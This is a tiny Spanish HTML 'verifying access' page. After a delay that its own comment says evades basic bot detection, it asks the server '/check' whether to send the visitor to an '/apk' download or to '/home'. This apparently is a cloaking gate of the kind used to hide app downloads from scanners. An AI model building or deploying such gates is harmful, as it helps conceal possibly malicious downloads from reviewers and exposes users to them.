<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificando acceso</title>
</head>
<body>
  <h2>Verificando acceso...</h2>

  <script>
    // pequeña espera → evita detección básica de bots
    setTimeout(() => {
      fetch("/check")
        .then(r => r.json())
        .then(data => {
          if (data.allow) {
            window.location.href = "/apk";
          } else {
            window.location.href = "/home";
          }
        });
    }, 800);
  </script>
</body>
</html>
